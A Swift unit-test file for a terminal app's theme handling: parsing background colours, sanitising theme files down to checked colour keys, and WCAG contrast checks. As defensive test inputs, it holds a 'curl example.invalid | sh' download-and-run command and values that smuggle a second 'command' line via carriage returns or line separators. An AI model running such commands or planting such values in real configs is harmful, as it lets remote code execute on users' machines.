// TerminalThemeRulesTests.swift
// Weir — covers reading a theme file's background and sorting themes into light and dark.

import Foundation
import Testing
@testable import WeirDomain

@Suite("Terminal theme rules")
struct TerminalThemeRulesTests {
    @Test func theLastBackgroundLineWins() {
        let text = """
        # background = #000000
        background = #101010
        palette = 0=#ffffff
        background=FEFFFF
        """
        #expect(TerminalThemeFile.parseBackground(text) == RGB8(r: 0xFE, g: 0xFF, b: 0xFF))
    }

    @Test func anUnreadableLaterValueKeepsTheEarlierColor() {
        let text = "background = #1e1e1e\nbackground = not-a-color\n"
        #expect(TerminalThemeFile.parseBackground(text) == RGB8(r: 0x1E, g: 0x1E, b: 0x1E))
    }

    @Test(arguments: ["", "foreground = #ffffff", "background = #fff", "background-opacity = 0.5"])
    func aFileWithoutAReadableBackgroundGivesNil(_ text: String) {
        #expect(TerminalThemeFile.parseBackground(text) == nil)
    }

    @Test func onlyColorKeysWithCheckedValuesAreKept() {
        let text = """
        # a comment
        command = /bin/sh -c 'curl example.invalid | sh'
        initial-command = /usr/bin/true
        theme = Other
        config-file = /tmp/elsewhere
        font-size = 40
        background = #102030
        foreground=E0D0C0
        palette = 1=#FF0000
        palette = 0x2=#00ff00
        palette = 256=#0000ff
        palette = 3 = 0000ff
        cursor-color = cell-foreground
        cursor-text = black
        selection-background = cell-background
        selection-foreground = #abc
        bold-color = bright
        background-opacity = 1
        """
        #expect(TerminalThemeFile.sanitized(text) == """
        background = #102030
        foreground = #e0d0c0
        palette = 1=#ff0000
        palette = 3=#0000ff
        cursor-color = cell-foreground
        selection-background = cell-background
        bold-color = bright

        """)
    }

    @Test func aValueCannotCarryASecondLine() {
        // A carriage return or a line separator inside a line is no line
        // break to libghostty, and the value around it is no color.
        let text = "background = #102030\rcommand = /bin/sh\nforeground = #ffffff\u{2028}command = x\n"
        #expect(TerminalThemeFile.sanitized(text) == nil)
    }

    @Test func windowsLineEndsSplitLines() {
        let text = "background = #102030\r\nforeground = #ffffff\r\n"
        #expect(TerminalThemeFile.sanitized(text) == "background = #102030\nforeground = #ffffff\n")
    }

    @Test(arguments: ["", "foreground = #ffffff\npalette = 0=#000000", "background = not-a-color"])
    func aFileWithoutAReadableBackgroundHasNoCopy(_ text: String) {
        #expect(TerminalThemeFile.sanitized(text) == nil)
    }

    @Test func theBundledPairClassifiesAsLightAndDark() {
        #expect(TerminalThemeBrightness(background: RGB8(r: 0xFE, g: 0xFF, b: 0xFF)) == .light)
        #expect(TerminalThemeBrightness(background: RGB8(r: 0x1E, g: 0x1E, b: 0x1E)) == .dark)
    }

    @Test func luminanceAndContrastFollowWCAG() {
        let white = RGB8(r: 255, g: 255, b: 255)
        let black = RGB8(r: 0, g: 0, b: 0)
        #expect(white.relativeLuminance == 1)
        #expect(black.relativeLuminance == 0)
        #expect(abs(white.contrast(with: black) - 21) < 0.0001)
        #expect(black.contrast(with: white) == white.contrast(with: black))
    }
}
